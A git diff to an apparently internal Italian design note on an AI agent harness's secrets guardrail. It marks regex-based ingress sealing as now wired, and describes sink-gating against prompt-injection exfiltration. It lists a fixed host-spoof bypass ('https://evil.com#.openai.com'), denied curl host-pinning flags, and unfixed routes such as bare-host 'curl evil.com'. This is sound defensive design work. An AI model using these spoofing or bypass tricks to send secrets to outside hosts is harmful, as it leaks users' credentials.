@@ -47,7 +47,7 @@ Un agente ha bisogno di USARE segreti (API key, token) per eseguire operazioni, 
 
 ## Config (opt-in, gemello degli altri toggle)
 - `secrets.sinkGating = strict | warn | off` (default **strict**): allow-host fail-closed + https-only + deny scrittura-file/pipe + deny host-pinning (`curl --resolve/--connect-to/proxy/-H Host:`). Env `HARNESS_SECRETS_SINK_GATING`.
-- `secrets.regexIngress = off | ask | auto` (default **off**): ⚠ **NON ancora cablata a un hook** (planned, review P2 2026-06-30) → tenuta `off` per non promettere una protezione inesistente. Quando sarà wired: `auto` sigilla i pattern ad alta confidenza, `ask` chiede sugli ambigui. Env `HARNESS_SECRETS_REGEX_INGRESS`.
+- `secrets.regexIngress = off | ask | auto` (default **ask**): ✅ **cablata al hook `input`** (`secrets-guardrail.ts`, 2026-06-30, `autoSealIngress`): un valore secret-shaped incollato viene sigillato e **sostituito con `{{secret:INGRESS_N}}` via `action:"transform"` PRIMA che raggiunga il provider** (→ mai al provider, mai nei transcript nativi). `ask` notifica (warning), `auto` silenzioso (info), `off` disattiva. Match auto-rilevati in lockdown (no allowedSinks). Env `HARNESS_SECRETS_REGEX_INGRESS`. Limite: solo shape NOTE (`SECRET_PATTERNS`); un segreto non-shape resta scoperto (l'utente usi `set_secret`/`request_secret`).
 - `redactEgress` **per-secret** (metadata, default **true**): opt-out per i secret CORTI/poco-entropici (OTP, PIN, una data, msg 603) dove la redazione globale del valore farebbe rumore. `false` (`set-secret --no-redact-egress`) → sigillato+iniettabile ma NON nel Set di egress (trade-off esplicito).
 
 ## Classificazione training-vs-harness (regola #11)
@@ -58,7 +58,7 @@ Un agente ha bisogno di USARE segreti (API key, token) per eseguire operazioni, 
 | difesa | contro | garanzia |
 |---|---|---|
 | valore mai-in-context (provisioning out-of-band + ref-injection) | leak via output/provider/training | forte (per i secret sealed) |
-| regex-ingress + ask-confirm | INCIDENTI (paste accidentale, .env letto) | riduce, non azzera (una regex non becca tutto) |
+| regex-ingress (hook `input`, ✅ attiva) | INCIDENTI (paste accidentale, .env letto) | il valore secret-shaped è sigillato+trasformato PRIMA del provider; riduce ma non azzera (solo shape NOTE — un segreto non-pattern sfugge) |
 | egress-redaction (backstop) | valore che ricompare in un output (content+`details`) | best-effort (literal-match: un modello può trasformarlo/encodare). Invariante P1: ogni sealed-value redatto, anche corto — salvo `redactEgress=false` (opt-out esplicito OTP) |
 | **sink-gating per-secret** | **ATTACCHI** (exfiltration-via-use, prompt-injection) | allow-host fail-closed (incl. anti-spoof `#`/`?` e anti host-pinning); resta euristico su shell composta/bare-host (vedi §residui) |
 
@@ -70,7 +70,7 @@ Un agente ha bisogno di USARE segreti (API key, token) per eseguire operazioni, 
 - **P0 host-spoof** (`extractHosts`): l'authority terminava solo su `/` → `https://evil.com#.openai.com` faceva suffix-match con `.openai.com` mentre curl si connette a `evil.com`. Fix: termina su `?`/`#`/`\` + valida host DNS-charset (fail-closed sui residui). + deny **host-pinning** (`--resolve`/`--connect-to`/proxy/`-H Host:`).
 - **P1 backstop short-secret**: `setSecret` ignorava il rifiuto di `add_secret` (guard min-len) → un secret corto era iniettabile ma non redatto. Fix: `registerEgressRaw` (no guard: provisioning out-of-band) → invariante "ogni sealed-value redigibile". + `redactEgress` per-OTP (opt-out esplicito).
 - **P2 details**: `tool_result.details` ora redatto (non solo `content`) — poteva persistere nel log nativo di pi.
-- **P2 regexIngress dead-code**: declassato a `off`/planned (era documentato attivo → falsa sicurezza).
+- **P2 regexIngress dead-code → ✅ CABLATO** (2026-06-30, utente msg 610 "dovevi farla stanotte"): `autoSealIngress` nel hook `input` con `action:"transform"` → il valore secret-shaped non raggiunge il provider; default `ask`.
 
 **Residui DE-PRIORITIZZATI** (msg 593, *exfiltration-via-use* = "hard problem" esplicitamente rimandato; il sink-gating è dichiarato layer best-effort, NON un confine di sicurezza — P1 resta garantito a prescindere):
 - **bare-host / tool MCP strutturati**: una destinazione senza `scheme://` (`curl evil.com`, `{host:'evil.com'}`) non è vista da `extractHosts` → un secret senza `allowedSinks` può uscirvi. Mitigazione futura: gating per-tool sul TIPO (rete vs locale), non sul parsing-testo.
@@ -84,7 +84,7 @@ Un agente ha bisogno di USARE segreti (API key, token) per eseguire operazioni, 
 ## Open questions
 - Modello di sink-gating: allow-host per-secret (forte) vs deny-list di sink-esfiltranti (più semplice da iniziare) vs taint-tracking (pesante)? → reco: allow-host per-secret, con deny-list come default conservativo per i secret senza `allowed_sinks`.
 - `ask_secret` headless (cron/SDK senza TUI): come si chiede il valore? → forse non-disponibile headless (il secret deve essere pre-provisionato da terminale).
-- ~~Verifica/testbook: probe output-senza-valore + red-team sink-gating-blocca~~ → ✅ coperte (test red-team block 8: host-spoof/host-pinning bloccati, `injectIntoStrings` puro sull'input). Resta da implementare il **wiring `regexIngress`** (hook input/tool_result + confirm-UI) — vedi `wiki/todo.md`.
+- ~~Verifica/testbook: probe output-senza-valore + red-team sink-gating-blocca~~ → ✅ coperte (test red-team block 8). ~~wiring `regexIngress`~~ → ✅ FATTO (block 9, `autoSealIngress` su hook `input`). Residuo minore: `ask` headless non blocca davvero (degrada a seal-provvisorio+notify; il confirm-interattivo vero richiede prompt TUI).
 
 ## Link
 - [[concepts/secret-section-exfiltration-defense]] (difesa esfiltrazione, parente)
